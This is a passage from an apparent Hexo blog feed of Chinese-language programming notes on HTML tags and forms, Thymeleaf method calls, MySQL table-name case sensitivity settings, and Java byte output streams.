punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><ul><li>使用<code>&lt;a&gt;</code>标签</li><li>属性:<ul><li>href:指向链接跳转的目标地址,相对路径&#x2F;完整地址</li><li>target:规定在何处打开链接文档<ul><li>_self:表示在当前窗口中打开(默认)</li><li>_blank:在新窗口中打开链接</li><li>可以设置一个内联框架的 name 属性值,链接将会在指定的内联框架中打开</li></ul></li></ul></li><li>创建超链接时,链接处写#”id”,会跳转到 id 所代表的元素(在 HTML 中,每个元素的唯一标识就是 id,id 不可重复)</li></ul><h2 id="块标签"><a href="#块标签" class="headerlink" title="块标签"></a>块标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>  <span class="token punctuation">></span></span>默认没有任何效果,结合CSS使用,文本信息在一行内展示,行内标签  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>每一个div占满一整行,块级标签,默认无效果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h2><p>为了提高程序可读性而提供的一些无样式的标签</p><h2 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50%<span class="token punctuation">"</span></span> <span class="token attr-name">cellpadding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- border规定单元格是否有边框,cellpadding规定单元格边沿空白,cellsapcing规定单元格之间的空白bgcolor背景色,align对齐方式--></span><span class="token comment">&lt;!-- --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">></span></span>    表格标题  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 定义表头单元格--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>name1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50%<span class="token punctuation">"</span></span> <span class="token attr-name">cellpadding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">rowspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!--colspan合并列,rowspan合并行--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>name1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>name2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h2><ul><li><p>用于采集用户输入的数据,和服务器进行交互</p></li><li><p>&lt;form&gt;,定义表单,界定一个采集用户数据的范围</p></li><li><p><strong>表单项中的数据要想被提交,必须指定其 name 属性</strong></p></li><li><p>属性:</p><ul><li><p>action:制定提交数据的 url</p></li><li><p>method:指定提交方式(共七种,两种较常用)</p><ul><li><p>get</p><p>1:请求参数会在地址栏中显示,封装在请求行中</p><p>2:请求参数大小是有限制的</p><p>3.不太安全</p></li><li><p>post</p><p>1:请求参数不会在 URL 栏中显示,封装在 HTTP 请求体中</p><p>2.请求参数大小没有限制</p><p>3:较为安全</p></li></ul></li><li><p>enctype:</p><ul><li><p>multipart&#x2F;form-data</p><p>涉及文件上传，必须设置此项</p></li><li><p>application&#x2F;x-www-form-urlencoded</p></li></ul></li></ul></li><li><p>表单项标签</p><ul><li><p>input:&lt;type&gt;属性值,改变元素展示的样式</p><p>&lt;label&gt;指定输入项的文字描述信息,for 属性一般会和 input 的 id 属性值对应,可通过点击 label 区域,使得对应的输入框获取焦点</p><ul><li><p>text:文本输入框(默认值)</p><p>placeholder:指定输入框的提示信息,当输入框的内容发生变化,会自动清空提示信息</p></li><li><p>password:密码输入框</p></li><li><p>radio:单选框</p><p>1.要想让多个单选框实现单选的效果,则多个单选框的 name 属性值必须相同</p><p>2.一般会给每一个单选框提供 value 属性,指定其被选中后提交的值</p><p>3.checked 属性,可以指定默认值</p></li><li><p>checkbox:复选框</p></li><li><p>file:文件选择框</p></li><li><p>hidden:隐藏域,用于提交一些信息</p></li><li><p>submit:提交按钮</p></li><li><p>button:普通按钮(结合 js)</p></li><li><p>image:图片提交按钮,通过 src 属性指定图片的路径</p></li><li><p>data:日期</p></li><li><p>email:邮箱</p></li><li><p>number:数字</p></li></ul></li><li><p>select:下拉列表</p><ul><li>option 指定列表项</li></ul></li><li><p>textarea:文本域</p><ul><li>cols:指定列数</li><li>rows:指定行数</li></ul></li></ul></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>    <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>    <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span>    <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span>    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span>  <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  性别:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span> <span class="token punctuation">/></span></span>男  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>famale<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>女  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  爱好:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hobby<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shopping<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>购物  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hobby<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>game<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>游戏  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hobby<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Java<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span> <span class="token punctuation">/></span></span>Java  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  照片:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  省份:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>province<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>--请选择--<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>山西<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>北京<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  自我描述:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reset<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>清空重填<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux</title>
      <link href="/2022/11/05/linux/"/>
      <url>/2022/11/05/linux/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用thymeleaf时调用后台java的方法</title>
      <link href="/2022/10/19/%E4%BD%BF%E7%94%A8thymeleaf%E6%97%B6%E8%B0%83%E7%94%A8%E5%90%8E%E5%8F%B0java%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2022/10/19/%E4%BD%BF%E7%94%A8thymeleaf%E6%97%B6%E8%B0%83%E7%94%A8%E5%90%8E%E5%8F%B0java%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ol><li><p>首先需要将需要调用方法的对象交由spring容器管理</p><p>这样</p><p><img src="/2022/10/19/%E4%BD%BF%E7%94%A8thymeleaf%E6%97%B6%E8%B0%83%E7%94%A8%E5%90%8E%E5%8F%B0java%E7%9A%84%E6%96%B9%E6%B3%95/image-20221019202537221.png" alt="image-20221019202537221"></p><p>或者这样</p><p><img src="/2022/10/19/%E4%BD%BF%E7%94%A8thymeleaf%E6%97%B6%E8%B0%83%E7%94%A8%E5%90%8E%E5%8F%B0java%E7%9A%84%E6%96%B9%E6%B3%95/image-20221019202619953.png" alt="image-20221019202619953"></p></li><li><p>接下来在需要调用该方法的地方，使用<code>@xxx.method()</code>即可</p><p><img src="/2022/10/19/%E4%BD%BF%E7%94%A8thymeleaf%E6%97%B6%E8%B0%83%E7%94%A8%E5%90%8E%E5%8F%B0java%E7%9A%84%E6%96%B9%E6%B3%95/image-20221019202721596.png" alt="image-20221019202721596"></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql大小写敏感的问题</title>
      <link href="/2022/10/15/mysql%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/10/15/mysql%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="一、MySQL-是大小写敏感的吗"><a href="#一、MySQL-是大小写敏感的吗" class="headerlink" title="一、MySQL 是大小写敏感的吗"></a>一、MySQL 是大小写敏感的吗</h1><p>MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。如果你稍加不注意就会出现在本机开发的程序运行一切正常，发布到服务器行就出现表名找不到的问题，一头雾水。</p><p>由于这个原因，在阿里巴巴规约中这样要求：</p><blockquote><p>【强制】表名、字段名必须使用小写字母或数字 ， 禁止出现数字开头，禁止两个下划线中间只 出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。</p></blockquote><p>因此，数据库名、 表名、字段名，都不允许出现任何大写字母，避免引起不必要的麻烦。</p><h1 id="二、MySQL-的大小写敏感是由参数控制的"><a href="#二、MySQL-的大小写敏感是由参数控制的" class="headerlink" title="二、MySQL 的大小写敏感是由参数控制的"></a>二、MySQL 的大小写敏感是由参数控制的</h1><p>mysql 大小写敏感配置相关的两个参数，lower_case_file_system 和 lower_case_table_names。</p><p>查看当前 mysql 的大小写敏感配置，可以使用如下语句</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show global variables like &#39;%lower_case%&#39;;+------------------------+-------+| Variable_name          | Value |+------------------------+-------+| lower_case_file_system | ON    || lower_case_table_names | 0     |+------------------------+-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明如下：</p><ol><li>lower_case_file_system，代表当前系统文件是否大小写敏感，只读参数，无法修改。ON 大小写不敏感，OFF 大小写敏感。<ul><li>此变量描述数据所在的操作系统的文件目录是否区分大小写。 OFF 表示文件名区分大小写，ON 表示它们不区分大小写。此变量是只读的，因为它反映了文件系统的属性，设置它对文件系统没有影响。</li></ul></li><li>lower_case_table_names，代表表名是否大小写敏感，可以修改，参数有 0、1、2 三种。<ul><li>0 大小写敏感。（Unix，Linux 默认） 创建的库表将原样保存在磁盘上。如 create database TeSt;将会创建一个 TeSt 的目录，create table AbCCC …将会原样生成 AbCCC.frm 文件，SQL 语句也会原样解析。</li><li>1 大小写不敏感。（Windows 默认） 创建的库表时，MySQL 将所有的库表名转换成小写存储在磁盘上。 SQL 语句同样会将库表名转换成小写。 如需要查询以前创建的 Testtable（生成 Testtable.frm 文件），即便执行 select _ from Testtable，也会被转换成 select _ from testtable，致使报错表不存在。</li><li>2 大小写不敏感（OS X 默认） 创建的库表将原样保存在磁盘上， 但 SQL 语句将库表名转换成小写。</li></ul></li></ol><h1 id="三、MySQL-大小写敏感如何设置"><a href="#三、MySQL-大小写敏感如何设置" class="headerlink" title="三、MySQL 大小写敏感如何设置"></a>三、MySQL 大小写敏感如何设置</h1><p>在 Linux 系统中修改 my.cnf 文件，在 Windows 下修改 my.ini 文件，新增或修改以下内容。</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">lower_case_table_names &#x3D; 0 或 lower_case_table_names &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后重启 MySQL 服务才可以生效。</p><h1 id="四、开发注意事项"><a href="#四、开发注意事项" class="headerlink" title="四、开发注意事项"></a>四、开发注意事项</h1><ol><li>如果要将 lower_case_table_names 从 0（敏感）修改为 1（不敏感）时，必须先对旧数据表的表名进行处理，把所有数据库的表名先改为小写，最后再设置 lower_case_table_names 为 1，否则依然会出现无法找到表名的问题。</li><li>在 Windows 上 lower_case_table_names 默认值为 1（不敏感），在 macOS 上默认值为 2（不敏感）。在 Linux 上不支持值 2，服务器强制该值为 0（敏感）。</li><li>并且 MySQL 官方也提示说：如果在数据目录驻留在不区分大小写的文件系统（例如 Windows 或 macOS）上，则不应将 lower_case_table_names 设置为 0。</li><li>否则将出现 MySQL 服务无法启动的问题。</li></ol><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>由于操作系统不同导致大小写敏感的默认设置不一致，我们在开发时一定要注意，应该养成严格的意识，SQL 语句一律采用小写字母，避免无意义的踩坑。</p><p>MySQL 是日常工作中使用最对的数据库之一，所以必须要要较为深入和全面的掌握，对于高阶人员还要掌握分布式事务、各种数据库锁、传播机制等。</p><blockquote><p>作者：尹洪亮<br>链接：<a href="https://www.jianshu.com/p/f2eabcef6577">https://www.jianshu.com/p/f2eabcef6577</a><br>来源：简书</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IO流</title>
      <link href="/2022/10/10/IO%E6%B5%81/"/>
      <url>/2022/10/10/IO%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h1 id="字节输出流"><a href="#字节输出流" class="headerlink" title="字节输出流"></a>字节输出流</h1><p><code>java.io.OutputStream</code> </p><p>  此抽象类是表示输出字节流的所有类的超类，定义了一些子类共有的成员方法：</p><p>  <code>public void close()</code> : 关闭此输出流并释放与此流相关联的任何系统资源</p><p>  <code>public void flush()</code> : 刷新此输出流并强制任何缓冲的输出字节被写出</p><p>  <code>public void write(byte[] b)</code> : 将b.length字节从指定的字节数组写入此输出流</p><p>  <code>public void write(byte[] b, int off, int len)</code> : 从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流</p><p>  <code>public abstract void write(int b)</code> : 将指定的字节输出流</p><h2 id="文件输出流"><a href="#文件输出流" class="headerlink" title="文件输出流"></a>文件输出流</h2><p><code>java.io.FileOutputStream extends OutputStream</code></p><p>  用于将数据写出到文件</p><h3 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h3><ul><li><p><code>FileOutputStream(String name)</code>创建一个向具有指定名称的文件中写入数据的输出文件流。</p></li><li><p><code>FileOutputStream(File file)</code> 创建一个向指定 File 对象表示的文件中写入数据的文件输出流。</p><p>参数:写入数据的目的</p><ul><li><p><code>String name</code> : 目的地是一个文件的路径</p></li><li><p><code>File file</code> : 目的地是一个文件</p></li></ul><p>作用:</p><ol><li>创建一个<code>FileOutputStream</code>对象</li><li>会根据构造方法中传递的文件&#x2F;文件路径,创建一个空的文件</li><li>会把<code>FileOutputStream</code>对象指向创建好的文件</li></ol></li></ul><h3 id="写入数据的原理-内存–-gt-硬盘"><a href="#写入数据的原理-内存–-gt-硬盘" class="headerlink" title="写入数据的原理(内存–&gt;硬盘)"></a>写入数据的原理(内存–&gt;硬盘)</h3><p>  java程序–&gt;JVM(java虚拟机)–&gt;OS(操作系统)–&gt;OS调用写数据的方法–&gt;把数据写入到文件中</p><h3 id="字节输出流的使用步骤-重点"><a href="#字节输出流的使用步骤-重点" class="headerlink" title="字节输出流的使用步骤(重点):"></a>字节输出流的使用步骤(重点):</h3><ol><li>创建一个<code>FileOutputStream</code>对象,构造方法中传递写入数据的目的地</li><li>调用<code>FileOutputStream</code>对象中的方法write,把数据写入到文件中</li><li>释放资源(流使用会占用一定的内存,使用完毕要把内存清空,提高程序的效率)</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>File 类</title>
      <link href="/2022/10/10/File%E7%B1%BB/"/>
      <url>/2022/10/10/File%E7%B1%BB/</url>
      
